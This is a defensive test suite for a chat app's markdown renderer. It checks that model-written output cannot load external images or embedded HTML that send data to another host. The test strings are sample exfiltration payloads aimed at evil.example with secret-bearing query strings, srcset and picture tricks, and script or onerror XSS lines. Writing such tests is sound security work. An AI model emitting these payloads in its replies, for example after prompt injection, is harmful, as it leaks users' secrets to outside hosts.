import { fireEvent, render } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { MessageResponse } from '../components/ai-elements/message'

/**
 * What model-written markdown may do in a conversation.
 *
 * The renderer is downstream of prompt injection: whatever reaches it was
 * written by a model that may have read someone else's text. So the question
 * each case asks is not "does this look right" but "what does the browser
 * fetch, and where does it go".
 */

function renderMarkdown(source: string) {
  return render(<MessageResponse>{source}</MessageResponse>).container
}

describe('chat markdown images', () => {
  it('never loads an external image, from markdown or from raw HTML', () => {
    // A cross-origin `<img>` is fetched with no click, and the URL it fetches
    // can carry whatever the model was induced to put in it.
    for (const source of [
      '![alt text](https://evil.example/pixel.png?d=secret)',
      '<img src="https://evil.example/pixel.png?d=secret">',
      '![a](http://evil.example/pixel.png)',
    ]) {
      const container = renderMarkdown(source)
      expect(container.querySelector('img'), source).toBeNull()
    }
  })

  it('renders an external image as a link that names its domain', () => {
    const container = renderMarkdown('![alt text](https://evil.example/pixel.png?d=secret)')
    const link = container.querySelector('a[data-external-image]')
    expect(link).not.toBeNull()
    // The domain is visible without hovering, the full URL is the tooltip, and
    // it opens in a new tab if the person chooses to.
    expect(link?.textContent).toContain('evil.example')
    expect(link?.getAttribute('href')).toBe('https://evil.example/pixel.png?d=secret')
    expect(link?.getAttribute('title')).toBe('https://evil.example/pixel.png?d=secret')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('still renders an image we serve ourselves', () => {
    for (const source of ['![a](/api/v1/files/x.png)', `![a](${window.location.origin}/api/v1/files/x.png)`]) {
      const image = renderMarkdown(source).querySelector('img')
      expect(image, source).not.toBeNull()
      expect(image?.getAttribute('src'), source).toContain('/api/v1/files/x.png')
    }
  })

  it('loads nothing for a source that is not an image we can judge', () => {
    for (const source of ['![a](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)', '![a](javascript:alert(1))']) {
      const container = renderMarkdown(source)
      expect(container.querySelector('img'), source).toBeNull()
      expect(container.querySelector('a[data-external-image]'), source).toBeNull()
    }
  })

  it('reaches no other host, whatever shape the source arrives in', () => {
    // The invariant is about what the browser fetches, not about which branch
    // produced it. A protocol-relative `//host/path`, for instance, Streamdown
    // resolves to `/path` before this code sees it — same-origin, and safe for
    // a reason worth pinning rather than re-deriving.
    //
    // Asserted on the rendered markup itself, not on elements that may not
    // exist. Two earlier versions of this test were vacuous in the same way —
    // first a `continue` past every case with no `<img>`, then an empty
    // `querySelectorAll` — and both times the row that asserted nothing was
    // the one aimed at `srcset`. The host name appearing anywhere in the DOM
    // is the thing that cannot be satisfied by rendering nothing.
    for (const source of [
      '![a](//evil.example/x.png)',
      '<img src="//evil.example/x.png">',
      '![a](https://evil.example/x.png)',
      '<img srcset="https://evil.example/x.png 1x">',
      '<img src="/api/v1/files/x.png" srcset="https://evil.example/x.png 1x">',
    ]) {
      const container = renderMarkdown(source)
      for (const element of container.querySelectorAll('*')) {
        // Every attribute a browser fetches from without being asked. `href` is
        // not one of them, and is the one place the host may legitimately
        // appear: the link a blocked image degrades to (D5).
        for (const attribute of ['src', 'srcset', 'poster', 'data', 'style', 'background']) {
          expect(element.getAttribute(attribute) ?? '', `${source} ${attribute}`).not.toContain('evil.example')
        }
        if (element.hasAttribute('href')) {
          expect(element.matches('a[data-external-image]'), `${source} href on ${element.tagName}`).toBe(true)
        }
      }
    }
  })

  /**
   * `<picture>` resolves to its first matching `<source>`, so an external
   * `srcset` there is a zero-click fetch to a host the model named — and the
   * same-origin `<img>` this file renders is what activates it, because a
   * `<picture>` with no `<img>` fetches nothing. Neither `urlTransform` (which
   * is never called for `srcSet`) nor `components.img` (which governs `<img>`
   * alone) sees it; the sanitize schema has to take `<source>` away.
   */
  it('does not let a <picture> fetch through a <source> behind the image component', () => {
    for (const source of [
      '<picture><source srcset="https://evil.example/leak?d=SECRET"><img src="/api/v1/files/x.png"></picture>',
      '<details><picture><source srcset="https://evil.example/d.png"><img src="/api/v1/files/x.png"></picture></details>',
    ]) {
      const container = renderMarkdown(source)
      expect(container.querySelector('source'), source).toBeNull()
      expect(container.innerHTML, source).not.toContain('evil.example')
      // And the same-origin image it wrapped still renders.
      expect(container.querySelector('img')?.getAttribute('src'), source).toContain('/api/v1/files/x.png')
    }
  })
})

describe('chat markdown links', () => {
  it('gives an in-app path a working destination, without a confirmation step', () => {
    // Blanking every non-http URL gave `href=""`, which reloads the page on
    // click; and an in-app path does not need the external-link confirmation,
    // since it is this instance.
    const container = renderMarkdown('[go](/projects/abc)')
    const clickable = container.querySelector('a, button')
    expect(clickable).not.toBeNull()
    expect(container.querySelector('a[href=""]')).toBeNull()
  })

  it('keeps the confirmation on an external link', () => {
    // Streamdown asks at click time and renders a button either way, so what
    // this pins is that the external URL is not turned into a bare href that
    // navigates on its own.
    const container = renderMarkdown('[go](https://good.example/page)')
    expect(container.querySelector('a[href="https://good.example/page"]')).toBeNull()
    expect(container.querySelector('[data-streamdown="link"]')).not.toBeNull()
  })

  /**
   * The rendered DOM is identical with and without `linkSafety`, because the
   * check runs on click — so only a click distinguishes them. Without the
   * config, an in-app path takes the confirmation modal a stranger's URL
   * deserves; with it, only the external one does.
   */
  it('confirms an external link on click and lets an in-app one through', async () => {
    const opened: string[] = []
    vi.stubGlobal('open', (url: string) => { opened.push(url); return null })
    try {
      fireEvent.click(renderMarkdown('[go](/projects/abc)').querySelector('button')!)
      await new Promise(resolve => setTimeout(resolve, 0))
      expect(opened).toEqual(['/projects/abc'])
      expect(document.querySelector('[data-streamdown="link-safety-modal"]')).toBeNull()

      fireEvent.click(renderMarkdown('[go](https://good.example/page)').querySelector('button')!)
      await new Promise(resolve => setTimeout(resolve, 0))
      // Not followed; the person is asked first.
      expect(opened).toEqual(['/projects/abc'])
      expect(document.querySelector('[data-streamdown="link-safety-modal"]')).not.toBeNull()
    } finally {
      vi.unstubAllGlobals()
    }
  })

  it('drops the raw HTML that carries its own fetch', () => {
    for (const source of [
      '<iframe src="https://evil.example/"></iframe>',
      '<object data="https://evil.example/x"></object>',
      '<embed src="https://evil.example/y">',
      '<video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>',
      '<svg onload="alert(1)"><circle r="1"/></svg>',
      '<script>alert(1)</script>',
    ]) {
      const container = renderMarkdown(source)
      expect(container.innerHTML, source).not.toContain('evil.example')
      expect(container.querySelector('iframe, object, embed, video, script'), source).toBeNull()
    }
  })

  it('strips an event handler from raw HTML', () => {
    const container = renderMarkdown('<img src="/api/v1/files/x.png" onerror="alert(1)">')
    expect(container.innerHTML).not.toContain('onerror')
  })
})
